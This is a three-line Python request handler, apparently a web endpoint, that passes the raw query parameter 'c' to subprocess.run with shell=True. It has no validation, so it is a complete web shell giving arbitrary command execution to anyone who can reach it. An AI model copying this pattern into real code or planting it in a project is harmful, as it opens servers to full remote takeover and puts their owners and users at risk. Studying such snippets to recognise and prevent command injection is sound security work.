def run(request):
    import subprocess
    subprocess.run(request.args.get("c"), shell=True)
